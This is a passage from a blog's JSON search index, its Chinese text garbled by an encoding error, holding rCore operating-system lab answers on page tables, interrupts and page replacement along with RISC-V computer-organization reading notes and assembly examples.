å¤„ç†å™¨åˆ©ç”¨ç‡ï¼Œå¢å¼ºäº¤äº’æ€§","link":"","tags":[{"name":"rCore","slug":"rCore","permalink":"https://dingiso.github.io/tags/rCore/"},{"name":"OS","slug":"OS","permalink":"https://dingiso.github.io/tags/OS/"},{"name":"risc-v","slug":"risc-v","permalink":"https://dingiso.github.io/tags/risc-v/"}]},{"title":"rCoreå®éªŒå››æ€»ç»“","date":"2020-07-25T05:47:21.000Z","path":"2020/07/25/å®éªŒå››/","text":"å®éªŒå››çš„åˆ†æåŠè§£ç­” å®éªŒå›› åŸç†ï¼šçº¿ç¨‹åˆ‡æ¢ä¹‹ä¸­ï¼Œé¡µè¡¨æ˜¯ä½•æ—¶åˆ‡æ¢çš„ï¼Ÿé¡µè¡¨çš„åˆ‡æ¢ä¼šä¸ä¼šå½±å“ç¨‹åº / æ“ä½œç³»ç»Ÿçš„è¿è¡Œï¼Ÿä¸ºä»€ä¹ˆï¼Ÿ 1ï¼‰çº¿ç¨‹ç»“æŸæ—¶ï¼Œra ç»“æŸå‡½æ•°è§¦å‘æ—¶é’Ÿä¸­æ–­ï¼Œä¸­æ–­å¤„ç†å‡½æ•°è°ƒç”¨ prepare_next_thread() , åœ¨å®é™…è°ƒç”¨ next_thread.prepare() æœ€åé€šè¿‡ activate() æ¿€æ´»é¡µè¡¨ï¼Œè¿›è¡Œé¡µè¡¨çš„åˆ‡æ¢ 2ï¼‰ä¸ä¼šå½±å“è¿è¡Œï¼Œé¡µè¡¨åˆ‡æ¢å‘ç”Ÿåœ¨ä¸­æ–­æœŸé—´ï¼Œæ“ä½œç³»ç»Ÿè¿è¡Œä¸­ï¼Œæˆ‘ä»¬è®¾ç«‹äº†å†…æ ¸æ ˆï¼Œä¸­æ–­æœŸé—´è°ƒç”¨çš„ï¼Œä¸€ç›´å­˜åœ¨ã€‚ è®¾è®¡ï¼šå¦‚æœä¸ä½¿ç”¨ sscratch æä¾›å†…æ ¸æ ˆï¼Œè€Œæ˜¯åƒåŸæ¥ä¸€æ ·ï¼Œé‡åˆ°ä¸­æ–­å°±ç›´æ¥å°†ä¸Šä¸‹æ–‡å‹æ ˆï¼Œè¯·ä¸¾å‡ºï¼ˆæ€è·¯å³å¯ï¼Œæ— éœ€ä»£ç ï¼‰ï¼š ä¸€ç§æƒ…å†µä¸ä¼šå‡ºç°é—®é¢˜ - ä¸æ“ä½œ sp ä¸€ç§æƒ…å†µå¯¼è‡´å¼‚å¸¸æ— æ³•å¤„ç†ï¼ˆæŒ‡æ— æ³•è¿›å…¥ handle_interruptï¼‰- ä¸ä¿å­˜ sp å¯„å­˜å™¨ ä¸€ç§æƒ…å†µå¯¼è‡´äº§ç”ŸåµŒå¥—å¼‚å¸¸ï¼ˆæŒ‡ç¬¬äºŒä¸ªå¼‚å¸¸èƒ½å¤Ÿè¿›è¡Œåˆ°è°ƒç”¨ handle_interruptï¼Œä¸è€ƒè™‘åç»­æ‰§è¡Œæƒ…å†µï¼‰ - è¿è¡Œä¸¤ä¸ªçº¿ç¨‹ã€‚åœ¨ä¸¤ä¸ªçº¿ç¨‹åˆ‡æ¢çš„æ—¶å€™ï¼Œä¼šéœ€è¦åˆ‡æ¢é¡µè¡¨ã€‚ä½†æ˜¯æ­¤æ—¶æ“ä½œç³»ç»Ÿè¿è¡Œåœ¨å‰ä¸€ä¸ªçº¿ç¨‹çš„æ ˆä¸Šï¼Œä¸€æ—¦åˆ‡æ¢ï¼Œå†è®¿é—®æ ˆå°±ä¼šå¯¼è‡´ç¼ºé¡µï¼Œå› ä¸ºæ¯ä¸ªçº¿ç¨‹çš„æ ˆåªåœ¨è‡ªå·±çš„é¡µè¡¨ä¸­ ä¸€ç§æƒ…å†µå¯¼è‡´ä¸€ä¸ªç”¨æˆ·è¿›ç¨‹ï¼ˆå…ˆä¸è€ƒè™‘æ˜¯æ€ä¹ˆæ¥çš„ï¼‰å¯ä»¥å°†è‡ªå·±å˜ä¸ºå†…æ ¸è¿›ç¨‹ï¼Œæˆ–ä»¥å†…æ ¸æ€æ‰§è¡Œè‡ªå·±çš„ä»£ç  - é€šè¿‡ æ”¹å˜ sp çš„å­˜å‚¨ä½ç½®ï¼Œ ä½¿å¾—ç”¨æˆ·è¿›ç¨‹æœ‰èƒ½åŠ›è®¿é—®å¹¶ä¿®æ”¹åˆ° å®éªŒï¼šå½“é”®ç›˜æŒ‰ä¸‹ Ctrl + C æ—¶ï¼Œæ“ä½œç³»ç»Ÿåº”è¯¥èƒ½å¤Ÿæ•æ‰åˆ°ä¸­æ–­ã€‚å®ç°æ“ä½œç³»ç»Ÿæ•è·è¯¥ä¿¡å·å¹¶ç»“æŸå½“å‰è¿è¡Œçš„çº¿ç¨‹ï¼ˆä½ å¯èƒ½éœ€è¦é˜…è¯»ä¸€ç‚¹åœ¨å®éªŒæŒ‡å¯¼ä¸­æ²¡æœ‰æåˆ°çš„ä»£ç ï¼‰ handler.rs é€šè¿‡å¼€å¯å¤–éƒ¨ä¸­æ–­çš„æ–¹æ³•ï¼Œ å€ŸåŠ© sbi è°ƒç”¨å‡½æ•°ï¼Œæ•æ‰é”®ç›˜å¯¼è‡´çš„å¤–éƒ¨ä¸­æ–­ï¼Œå…ˆåœ¨ ä¸­æ–­å¤„ç†æ—¶æ‰“å° ctrl+c çš„ sbi è°ƒç”¨è¿”å›å€¼ï¼Œä¸º3 ï¼Œåˆ¤æ–­å…¶ä¸º 3 åˆ™ kill_current_thread","link":"","tags":[{"name":"rCore","slug":"rCore","permalink":"https://dingiso.github.io/tags/rCore/"},{"name":"OS","slug":"OS","permalink":"https://dingiso.github.io/tags/OS/"},{"name":"risc-v","slug":"risc-v","permalink":"https://dingiso.github.io/tags/risc-v/"}]},{"title":"rCoreå®éªŒä¸‰æ€»ç»“","date":"2020-07-25T00:17:33.000Z","path":"2020/07/25/å®éªŒä¸‰/","text":"å®éªŒä¸‰çš„åˆ†æåŠè§£ç­” å®éªŒä¸‰ åŸç†ï¼šåœ¨ os/src/entry.asm ä¸­ï¼Œboot_page_table çš„æ„ä¹‰æ˜¯ä»€ä¹ˆï¼Ÿå½“è·³è½¬æ‰§è¡Œ rust_main æ—¶ï¼Œä¸è€ƒè™‘ç¼“å­˜ï¼Œç¡¬ä»¶é€šè¿‡å“ªäº›åœ°å€æ‰¾åˆ°äº† rust_main çš„ç¬¬ä¸€æ¡æŒ‡ä»¤ï¼Ÿ 1ï¼‰ å› ä¸ºæˆ‘ä»¬å°†å†…æ ¸ç»Ÿä¸€ä½¿ç”¨è™šæ‹Ÿåœ°å€ï¼Œæ‰€ä»¥éœ€è¦ä¸€ä¸ªåˆå§‹çš„é¡µè¡¨è¿›è¡Œæ˜ å°„ï¼Œä¹Ÿå°±æ˜¯é¢˜ä¸­æ‰€è¯´çš„boot_page_tableï¼Œ å› ä¸ºä»–çš„asw ä¸å…¨ä¸º0 ï¼Œ å®ƒåŒ…å«äº† ä¸¤ä¸ª 1GB å¤§é¡µ åˆ†åˆ«è¡¨ç¤ºæ˜ å°„ è™šæ‹Ÿåœ°å€ ç‰©ç†åœ°å€ 0x8000_0000 - 0xC000_0000 0x8000_0000 - 0xC000_0000 0xffff_ffff_8000_0000-0xffff_ffff_c000_0000 0x8000_0000 - 0xc000_0000 ç¬¬äºŒé¡¹ ä¸º æˆ‘ä»¬ä»¥åå°†è¦ä½¿ç”¨çš„è™šæ‹Ÿåœ°å€ ä¸ ç‰©ç†åœ°å€ä¹‹é—´çš„æ˜ å°„ ç¬¬ä¸€é¡¹ æ˜¯å› ä¸ºæˆ‘ä»¬ åœ¨ æ›¿æ¢é¡µè¡¨åï¼Œpc ä»ä¸ä¼šæ”¹å˜ï¼Œæ‰€ä»¥éœ€è¦å…ˆè¡Œåˆ©ç”¨è¿™ä¸ªç»§ç»­è¿è¡Œï¼Œå¸¦pcæ”¹å˜åï¼Œæ”¹ä¸º ç¬¬äºŒä¸ªæ˜ å°„ 2ï¼‰å…ˆä» satp é«˜ä½è¯»å–å†…å­˜çš„æ˜ å°„æ–¹å¼ï¼Œä½ä½è¯»å– boot_page_table çš„ç‰©ç†é¡µå·ï¼Œ è¯»å– VPN3 ã€30ï¼š38ã€‘ 0xff ä¸º 111111110 ä¸º 510 å®šä½åˆ° 510é¡¹ï¼Œ åˆ¤æ–­é¡µè¡¨é¡¹å¾—çŸ¥ä¸ºå¤§é¡µ ä»è¡¨ä¸­çŸ¥é“ç‰©ç†é¡µåŸºå€ä¸º 0x8000_0000 åŠ ä¸Šï¼Œé¡µå†…åç§»é‡ï¼Œæ‰¾åˆ°äº† rust_main() çš„åœ°å€ åˆ†æï¼šä¸ºä»€ä¹ˆ Mapping ä¸­çš„ page_tables å’Œ mapped_pairs éƒ½ä¿å­˜äº†ä¸€äº› FrameTrackerï¼ŸäºŒè€…æœ‰ä½•ä¸åŒï¼Ÿ page_tables å­˜æ”¾é¡µè¡¨ä¼šç”¨åˆ°çš„é¡µé¢ mapped_pairs å­˜æ”¾æ‰€æœ‰æ˜ å°„è¿‡çš„é¡µé¢ï¼Œ è¿›ç¨‹ç”¨åˆ°çš„é¡µé¢ åˆ†æï¼šå‡è®¾æŸè¿›ç¨‹éœ€è¦è™šæ‹Ÿåœ°å€ A åˆ°ç‰©ç†åœ°å€ B çš„æ˜ å°„ï¼Œè¿™éœ€è¦æ“ä½œç³»ç»Ÿæ¥å®Œæˆã€‚é‚£ä¹ˆæ“ä½œç³»ç»Ÿåœ¨å»ºç«‹æ˜ å°„æ—¶æœ‰æ²¡æœ‰è®¿é—® Bï¼Ÿå¦‚æœæœ‰ï¼Œå®ƒæ˜¯æ€ä¹ˆåœ¨è¿˜æ²¡æœ‰æ˜ å°„çš„æƒ…å†µä¸‹è®¿é—® B çš„å‘¢ï¼Ÿ æ²¡æœ‰è®¿é—®Bï¼Œæˆ‘ä»¬éœ€è¦ç”³è¯·å»ºç«‹é¡µè¡¨æ—¶ï¼Œä¼šå¾—åˆ° B çš„ç‰©ç†åœ°å€ï¼Œä½†ç‰¹æ®Šæƒ…å†µï¼Œ å¦‚æœBæ˜¯å†…æ ¸åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡çº¿æ€§åç§»é‡è¿›è¡Œè®¿é—®ã€‚ å®éªŒæ¡†æ¶å°šæœªå‡†å¤‡å®Œå–„ï¼‰å®éªŒï¼šäº†è§£å¹¶å®ç°æ—¶é’Ÿé¡µé¢ç½®æ¢ç®—æ³•ï¼ˆæˆ–ä»»ä½•ä½ æ„Ÿå…´è¶£çš„ç®—æ³•ï¼‰ï¼Œå¯ä»¥è‡ªè¡Œè®¾è®¡æ ·ä¾‹æ¥æ¯”è¾ƒæ€§èƒ½ ç½®æ¢ç®—æ³•åªéœ€è¦ä¿®æ”¹ os/src/memory/mapping/swapper.rsï¼Œä½ å¯èƒ½éœ€è¦åœ¨å…¶ä¸­è®¿é—®é¡µè¡¨é¡¹ swapper.rs åœ¨ main.rs ä¸­è°ƒç”¨ start_kernel_thread æ¥åˆ›å»ºçº¿ç¨‹ï¼Œä½ å¯ä»¥ä»»æ„ä¿®æ”¹å…¶ä¸­è¿è¡Œçš„å‡½æ•°ï¼Œä»¥è¾¾åˆ°æµ‹è¯•æ•ˆæœ ä¸ºç¡®ä¿PageTableEntry å®‰å…¨ä¼ è¾“ - ä¸ºæ—¶é’Ÿswapper å®ç° send æ¥å£ åœ¨pop çš„æ—¶å€™ï¼Œå¦‚æœè¯¥é¡µè¡¨é¡¹PageTableEntry ä»¥è®¿é—®ï¼ˆACCESS=1ï¼‰ æˆ–è€… å·²ä¿®æ”¹ ï¼ˆDIRTY=1ï¼‰ å°±å°†å…¶ç½®é›¶ å¦åˆ™ï¼Œ å°±å°†å…¶æ›¿æ¢æ‰","link":"","tags":[{"name":"rCore","slug":"rCore","permalink":"https://dingiso.github.io/tags/rCore/"},{"name":"OS","slug":"OS","permalink":"https://dingiso.github.io/tags/OS/"},{"name":"risc-v","slug":"risc-v","permalink":"https://dingiso.github.io/tags/risc-v/"}]},{"title":"æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿ-RISC-V","date":"2020-07-23T08:03:05.000Z","path":"2020/07/23/è®¡ç®—æœºç»„æˆä¸è®¾è®¡RISC-V/","text":"æœ¬æ–‡æ˜¯åœ¨é˜…è¯»ã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿ-RISC-V ã€‹åå†™çš„ï¼Œä¸»è¦é’ˆå¯¹risc-væ¶æ„çš„å†…å®¹çš„é˜è¿° è®¡ç®—æœºç»„æˆä¸è®¾è®¡RISC-VChapter1 Computer Abstractions and Technology1.1 Intorductionè®¡ç®—æœºåº”ç”¨ä¸»è¦åˆ†ä¸‰ä¸ªé¢†åŸŸ ï¼š PC ï¼Œ æœåŠ¡å™¨ ï¼ŒåµŒå…¥å¼ åœ¨ç°åœ¨æ—¶ä»£ PC å·²ç»é€æ¸è¢« PMDï¼ˆPersonal Mobile Deviceï¼‰ æ‰€å–ä»£ æœ¬ä¹¦æ¶‰çŒçš„å†…å®¹ é«˜çº§è¯­è¨€å¦‚ä½•è½¬ä¸ºæœºå™¨è¯­è¨€ï¼Œç¡¬ä»¶å¦‚ä½•æ‰§è¡Œç¨‹åºï¼› è½¯ç¡¬ä»¶æ¥å£æ˜¯ä»€ä¹ˆï¼Œè½¯ä»¶å¦‚ä½•è®©ç¡¬ä»¶æ‰§è¡Œç‰¹å®šåŠŸèƒ½ï¼› ä»€ä¹ˆå†³å®šäº†ç¨‹åºçš„æ€§èƒ½ï¼Œæ€ä¹ˆæé«˜æ€§èƒ½ï¼Œé™ä½èƒ½è€—ï¼› å¹¶è¡Œè®¡ç®—çš„åŸå› åŠå…¶åç»­æ¼”è¿›ï¼› ç°ä»£è®¡ç®—æœºæ¶æ„ä¸­çš„å…«ä¸ªä¼Ÿå¤§æ€æƒ³ï¼› 1.2 å…«ä¸ªä¼Ÿå¤§çš„è®¡ç®—æœºæ€æƒ³ æ‘©å°”å®šå¾‹çš„å‘æ˜ æŠ½è±¡åŒ–æ–¹æ³• åŠ é€Ÿå¸¸ç”¨äº‹åŠ¡ å¹¶è¡Œè®¡ç®— æµæ°´çº¿æœºåˆ¶ é¢„æµ‹æœºåˆ¶ å†…å­˜çš„é‡‘å­—å¡”ç»“æ„ åˆ©ç”¨å†—ä½™æé«˜å¯é æ€§ ä¸¤ç§ åº•å±‚è½¯ä»¶ï¼š æ“ä½œç³»ç»Ÿ å’Œ ç¼–è¯‘å™¨ 1.6 è®¡ç®—æœºçš„è¡¨ç°å®šä¹‰æ—¶é—´ è¿è¡Œæ—¶é—´åˆ†ä¸º ï¼š ç»è¿‡æ—¶é—´ ï¼Œ ç›¸åº”æ—¶é—´ ï¼Œ è¿è¡Œæ—¶é—´ CPU æ‰§è¡Œæ—¶é—´åˆ†ä¸º ï¼š å•çº¯æ‰§è¡Œç¨‹åºçš„æ—¶é—´ ï¼Œ ä¸ºäº†æ‰§è¡Œç¨‹åº è€Œ è°ƒç”¨ æ“ä½œç³»ç»Ÿçš„æ—¶é—´ æ—¶é’Ÿå‘¨æœŸæ•°=æŒ‡ä»¤ä¸ªæ•°$$\\times$$æŒ‡ä»¤å¹³å‡æ—¶é’Ÿä¸ªæ•° clock cycles per instrunction,ç®€ç§° CPI ä¸ºæ‰€æœ‰æŒ‡ä»¤æ‰§è¡Œçš„æ—¶é’Ÿä¸ªæ•°çš„å¹³å‡ CPU æ‰§è¡Œæ—¶é—´ = æŒ‡ä»¤æ•° * CPI * æ—¶é’Ÿæ—¶é—´ è¯„åˆ¤æ ‡å‡† è¦ä¾æ®ä¸åŒæƒ…å†µè€Œåˆ¤æ–­ï¼Œå¦‚ä¸€äº›æœåŠ¡å™¨å¯¹IOå¾ˆä¾èµ–ï¼Œéœ€è¦è½¯ç¡¬ä»¶ç»¼åˆæ€§èƒ½ï¼Œ è€Œä¸€äº›åº”ç”¨åˆ™å¯èƒ½åªå…³æ³¨ ååé‡ æˆ–è€…ååº”æ—¶é—´ï¼Œæˆ–è€…ä¸¤è€…çš„ç»„åˆã€‚ æ‰€ä»¥ä¸ºæé«˜è¡¨ç°ï¼Œä½ å¿…é¡»è¦çŸ¥é“å“ªäº›æ–¹é¢å½±å“ç€ä»–ï¼Œä»è€Œæ–¹ä¾¿æ‰¾åˆ°ç“¶é¢ˆ æé«˜æ ‡å‡† å‡å°‘åº”ç”¨ç¨‹åºçš„æ—¶é’Ÿä¸ªæ•°æˆ–è€…æé«˜æ—¶é’Ÿé¢‘ç‡ 1.7 åŠŸè€—å¢™é¦–å…ˆä»‹ç»äº†8ä»£Intel CPUçš„é¢‘ç‡å’ŒåŠŸè€—èµ°åŠ¿å›¾ï¼›éœ€è¦æ³¨æ„çš„æ˜¯åœ¨Pentium4ï¼ˆ2001ï¼‰æ—¶ï¼Œé¢‘ç‡è¾¾åˆ°3.6GHz,åŠŸè€—è¾¾åˆ°103Mï¼Œèµ·åé¢‘ç‡ä¸åŠŸè€—éƒ½æœ‰é™ä½ï¼› å…¶æ¬¡ä»‹ç»å•ä¸ªæ™¶ä½“ç®¡çš„åŠ¨æ€åŠŸè€—(ç„¦è€³å’Œç“¦ç‰¹è§’åº¦ï¼‰ï¼š Energy1/2Capacitive load Voltages2 Power1/2Capacitive load Voltages2 Frequency switched Frequency switchedå’Œæ—¶é’Ÿé¢‘ç‡ç›¸å…³ï¼› with regard to the Figure, how could clock rates grow by a factor of 1000 while power increased by only a factor of 30?(é¢‘ç‡æœ‰1000å€å¢é•¿è€ŒåŠŸè€—åªæœ‰30å€å¢é•¿) Energy and thus power can be reduced by lowering the voltageï¼Œæ¯ä»£CPUéƒ½é‡‡ç”¨è¿™ç§æŠ€æœ¯ï¼Œå³æ¯ä»£ç”µå‹å‡å°‘15%ï¼ˆ0.0225ï¼‰ In 20 years, voltages have gone from 5V to 1V, which is why the increase in power is only 30 times.(0.0225x1000=22.530) ç°ä»£çš„é—®é¢˜æ˜¯ï¼Œç»§ç»­é™ä½ç”µå‹ä¼šä½¿æ™¶ä½“ç®¡too leakyï¼ˆæœåŠ¡å™¨èŠ¯ç‰‡40%åŠŸè€—æ¥æºäºleakageï¼‰ to try to adress the power problem, designers have already attached large devices to increase cooling. and they turn off parts of the chip that are not used in a given clock cycle. å°½ç®¡éœ€è¦é«˜æ˜‚çš„é™æ¸©è®¾å¤‡ï¼ˆ300WåŠŸè€—ï¼‰ï¼Œè¿™ç§æ–¹æ¡ˆè¿˜æ˜¯åº”ç”¨äºPCå’Œserverï¼Œè€ŒPMDåˆ™ä¸éœ€è¦ï¼› Power is a challenge for integrated circuits for 2 reasons: power must be brought in and distributed around the chip;ç°ä»£èŠ¯ç‰‡å¯èƒ½éœ€è¦æ•°ç™¾ä¸ªgroundå’Œpowerçš„å¼•è„š power is dissipated as heat and must be removed.(åŠŸè€—æ¶ˆè€—ä¸ºçƒ­é‡éœ€è¦æ›´è´µçš„æ•£çƒ­è®¾å¤‡) ä¸ºäº†è§£å†³èƒ½è€—é—®é¢˜ï¼Œå¼•å…¥å¤šå¤„ç†å™¨æ¦‚å¿µï¼Œè¦æ±‚æˆ‘ä»¬è¦é‡æ–°ç¼–å†™ç¨‹åºä»¥é€‚åº”ã€‚ Chapter2 è®¡ç®—æœº â€œè¯­è¨€â€ ä»‹ç»2.2 ç¡¬ä»¶ç¼–ç¨‹è¯­è¨€add a,b,c å°†å˜é‡bï¼Œcç›¸åŠ åæ”¾å…¥aä¸­ æ¯ä¸ª RISC-V æŒ‡ä»¤ åªæ‰§è¡Œä¸€ä¸ªæ“ä½œï¼Œæœ€å¤šå…è®¸ä¸‰ä¸ªå˜é‡ 1234&#x2F;&#x2F;ä¾‹1 a &#x3D; b+c+d+eadd a,b,cadd a,a,dadd a,a,e è®¾è®¡ç†å¿µ1 ï¼šç®€å•æœ‰åˆ©äºè§„æ•´åŒ– 2.3 æ“ä½œæ•°RISCVä¸­ï¼Œç®—æœ¯è¿ç®—æŒ‡ä»¤çš„æ“ä½œæ•°åªèƒ½æ¥è‡ªäºå¯„å­˜å™¨ï¼Œæ¯ä¸ªå¯„å­˜å™¨å¤§å°ä¸º64bitsï¼Œåªæœ‰32ä¸ª è®¾è®¡ç†å¿µ2ï¼šç®€æ´å°±æ˜¯é€Ÿåº¦ ç†è§£ï¼šå½“å¯„å­˜å™¨å˜å¤šï¼Œç¡¬ä»¶å¯»å€æ—¶é—´ä¼šéšä¹‹å˜é•¿ï¼Œä»è€Œé™ä½æ€§èƒ½ï¼› å¯„å­˜å™¨è¡¨ç¤ºæ–¹æ³• = X + æ•°å­— å¯„å­˜å™¨çš„å®¹é‡æ˜¯æœ‰é™çš„ï¼Œå½“éœ€è¦å¤§çš„æ•°æ®ç»“æ„æ—¶ï¼Œå°±éœ€è¦å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œå†…å­˜ç›¸æ¯”äºå¯„å­˜å™¨è¦å¤§çš„å¤šï¼Œä½†æ˜¯è®¿é—®é€Ÿåº¦ä¹Ÿæœ‰æ•°é‡çº§çš„å·®è·ã€‚ ä½†ç®—æœ¯æŒ‡ä»¤åªèƒ½æ“ä½œå¯„å­˜å™¨ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å…ˆå°†å†…å­˜ä¸­çš„æ•°æ®è¯»å…¥å¯„å­˜å™¨ï¼Œè¿›è¡Œæ“ä½œåï¼Œå†å­˜å›å†…å­˜ä¸­ï¼Œå…¶ä¸­ å†…å­˜-ã€‹å¯„å­˜å™¨ ç§°ä¸º loadï¼Œå¯„å­˜å™¨-ã€‹å†…å­˜ ç§°ä¸º store 1234#ä¾‹å­2 ï¼š g&#x3D;h+A[8] Aä¸ºå¤§64ä½æ•°æ® ç¼–è¯‘å™¨åˆ†é… g-X20 h-X21 Açš„åŸºå€å­˜åœ¨X22ld x9, 8(x22) &#x2F;&#x2F; ä¸´æ—¶å¯„å­˜å™¨ x9 å¾—åˆ° A[8]add x20,x21,x9 &#x2F;&#x2F; g &#x3D; h + A[8] 8(x22) ä¸ºä¸€ç§å†…å­˜è¡¨ç¤ºæ³•ï¼Œ8æ˜¯åç§»é‡ï¼Œx22 å­˜å‚¨äº†Aæ•°ç»„çš„åŸºå€ ç°åœ¨å¤§éƒ¨åˆ†ç»“æ„ä»ç„¶é‡‡ç”¨ å­—èŠ‚ å¯»å€çš„æ–¹å¼ï¼ŒRISC-Vä¹Ÿä¸ä¾‹å¤–ï¼›æ‰€ä»¥å¯„å­˜å™¨å’Œå†…å­˜éƒ½è¡¨ç¤ºä¸º0x8ï¼Œ0x10ï¼Œ0x18 ç­‰ åœ¨ 64bit ä¸­ byte çš„æ’åºé—®é¢˜ï¼Œä¸€èˆ¬æœ‰ä¸¤ç§æ–¹å¼ï¼š å¤§ç«¯-ä»å¤§åˆ°å°ï¼Œå°ç«¯-ä»å°åˆ°å¤§ RISC-V é‡‡ç”¨å°ç«¯å¯»å€çš„æ–¹å¼ 1234#ä¾‹å­3 A[12]&#x3D;h+A[8]ld x9,64(x22)add x9,x21,x9sd x9,96(x22) è¿™ç§å¹³å‡¡çš„è®¿é—®å†…å­˜çš„è¡Œä¸ºç§°ä¸º å¯„å­˜å™¨æº¢å‡º å¸¸é‡ å’Œ ç«‹å³æ•°RISC-V å°†è¿‘ä¸€åŠçš„æŒ‡ä»¤éœ€è¦æ“ä½œ ç«‹å³æ•° æˆ– å¸¸é‡ 123# ä¾‹4 ï¼š x22+4ld x9,AddConstant 4(x3) &#x2F;&#x2F; x9 &#x3D; constant 4add x22,x22,x9 ç¨‹åºç¼–è¯‘åä¼šå°†å¸¸é‡4 å†™å…¥å†…å­˜ä¸­ 12# ä¾‹5ï¼šç«‹å³æ•°æŒ‡ä»¤addi x22,x22,4 &#x2F;&#x2F;x22&#x3D;x22+4 æ³¨æ„: å¯¹äºå¸¸ç”¨çš„å¸¸é‡0 ï¼Œ RISC-V å°† 0 å›ºå®šæ”¾å…¥ x0 ä¸­ 2.5 æŒ‡ä»¤è¡¨ç¤º 2.6 é€»è¾‘æŒ‡ä»¤å·¦ç§» å³ç§» AND OR XOR NOT ç­‰ 2.7 åˆ†æ”¯æŒ‡ä»¤ä¸¤ä¸ªä¸»è¦æŒ‡ä»¤ï¼š 1234&#x2F;&#x2F; å¦‚æœç›¸ç­‰åˆ™ç»§ç»­beq rs1,rs2,L1&#x2F;&#x2F; å¦‚æœä¸ç­‰åˆ™ç»§ç»­bne rs1,rs2,L1 ä¾‹6å¦‚ä½•å°†ä»¥ä¸‹cè¯­è¨€ç¼–è¯‘ä¸ºRISC-Væ ¼å¼ 123// c è¯­è¨€if(i==j) f=g+h; else f = g-h; f g h i j x19 x20 x21 x22 x23 12345&#x2F;&#x2F; RISC - V bne x22,x23,Elseadd x19,x20,x21Else: sub x19,x20,x21Exit: ä¾‹7 - loops1while(save[i]==k) i+=1; i k æ•°ç»„åŸºå€ x22 x24 x25 1234567Loop: slli x10,x22,3 # x10 &#x3D; i*8 å·¦ç§»ä¸‰ä½add x10,x10,x25 # x10 &#x3D; save[i]çš„åœ°å€ld x9,0(x10) # x9 &#x3D; save[i]çš„å€¼bne x9,x24 Exit #å¦‚æœ save[i]ï¼&#x3D;k é€€å‡ºaddi x22,x22,1 # i&#x3D;i+1beq x0,x0,Loop #å›åˆ°å¼€å§‹Exit: åè¯è§£é‡Šï¼š åŸºæœ¬å—ï¼ˆ basic blockï¼‰ åŸºæœ¬å—å°±æ˜¯ä¸€ç³»åˆ—é™¤äº†ç»“å°¾å°±æ²¡æœ‰åˆ†æ”¯ï¼Œé™¤äº†å¼€å§‹å§ä»¬ä¸ºåˆ†æ”¯æ ‡ç­¾çš„è¯­å¥ï¼Œé€šä¿—æ¥è¯´ï¼Œåªè¦åŸºæœ¬å—ä¸­ç¬¬ä¸€æ¡æŒ‡ä»¤è¢«æ‰§è¡Œäº†ï¼Œé‚£ä¹ˆåŸºæœ¬å—å†…æ‰€æœ‰æ‰§è¡Œéƒ½ä¼šæŒ‰ç…§é¡ºåºä»…æ‰§è¡Œä¸€æ¬¡ ã€‚ç¼–è¯‘çš„ç¬¬ä¸€æ­¥å°±æ˜¯å°†ç¨‹åºåˆ†æˆåŸºæœ¬å— å…¶ä»–åˆ†æ”¯è¯­å¥blt å’Œ bge å°†å¯„å­˜å™¨çš„å€¼å½“åš è¡¥ç  è¿›è¡Œæ¯”è¾ƒ bltu å’Œ bgeu å°†å¯„å­˜å™¨çš„å€¼å½“ä½œæ— ç¬¦å·æ•°è¿›è¡Œæ¯”è¾ƒ 12# if x20&gt;&#x3D;x11 or if x20 negativebgeu x20,x11,IndexOutOfBounds 2.8 è®¡ç®—æœºç¡¬ä»¶å¯¹è¿‡ç¨‹çš„æ”¯æŒè¿‡ç¨‹æˆ–è€…å‡½æ•°æ˜¯ç”¨æ¥ç»“æ„åŒ–ç¨‹åºçš„å·¥å…·ï¼Œä½¿ç”¨è¿‡ç¨‹èƒ½å¤Ÿè®©ç¨‹åºå˜å¾—æ˜“è¯»ä¸”å¢å¼ºä»£ç çš„é‡ç”¨æ€§ï¼Œç¨‹åºå‘˜åªéœ€è¦å…³æ³¨ä»»åŠ¡çš„ä¸€éƒ¨åˆ†ã€‚å‚æ•°å¯ä»¥ç”¨æ¥ä¼ é€’å’Œè¿”å›å€¼ï¼Œå¯ä»¥ç”¨ä½œè¿‡ç¨‹å’Œå…¶ä»–ç¨‹åºçš„æ¥å£ã€‚æˆ‘ä»¬å¯ä»¥è®¤ä¸ºè¿‡ç¨‹å°±åƒä¸€ä¸ªæ‰§è¡Œç§˜å¯†ä»»åŠ¡çš„é—´è°ï¼Œè·å–æ‰€éœ€èµ„æºã€æ‰§è¡Œä»»åŠ¡ã€æ©ç›–è¡Œè¸ªï¼Œæœ€åå¸¦ç€ç»“æœå›åˆ°åŸå¤„ã€‚ä»»åŠ¡å®Œæˆåå°±ä¸å†å¹²æ¶‰å…¶ä»–ä»»åŠ¡ã€‚åŒæ ·æˆ‘ä»¬å¯ä»¥å°†è¿‡ç¨‹çš„æ‰§è¡Œåˆ†ä¸ºå…­æ­¥ : å°†å‚æ•°æ”¾åœ¨è¿‡ç¨‹èƒ½è®¿é—®çš„åœ°æ–¹ å°†æ§åˆ¶äº¤ç»™è¿‡ç¨‹ è·å–éœ€è¦çš„å­˜å‚¨èµ„æºç»™è¿‡ç¨‹ å®Œæˆé¢„å®šçš„ä»»åŠ¡ å°†ç»“æœæ”¾åˆ°è°ƒç”¨ç¨‹åºèƒ½è®¿é—®çš„åœ°æ–¹ å°†æ§åˆ¶äº¤å›æºç‚¹ ç”±äºå¯„å­˜å™¨æ˜¯åœ¨è®¡ç®—æœºä¸­æœ€å¿«çš„å­˜å‚¨å™¨ï¼Œç¨‹åºåº”å°½å¯èƒ½ä½¿ç”¨å¯„å­˜å™¨ã€‚RISC-Væä¾›äº†ä¸€äº›å¯„å­˜å™¨æ¥ç»™è°ƒç”¨è¿‡ç¨‹æ—¶ä½¿ç”¨ : x10-x17 : å­˜å‚¨éœ€è¦ä¼ é€’çš„å‚æ•° å’Œ è¿”å›å€¼ x1 : å­˜å‚¨è¿‡ç¨‹è°ƒç”¨æºç‚¹çš„åœ°å€ é™¤äº†åˆ†é…äº†è¿™äº›å¯„å­˜å™¨ï¼ŒRISC-Væä¾›äº†ä¸€æ¡è·³è½¬é“¾æ¥æŒ‡ä»¤jalã€‚ 1jal ProcedureAddress jal ï¼š è·³è½¬ å¹¶ è¿æ¥ ç¨‹åºç»“æ„ï¼Œä¸»è¦å®Œæˆ è·³è½¬åˆ°ProcedureAddressç»§ç»­æ‰§è¡Œ å°†ProcedureAddress 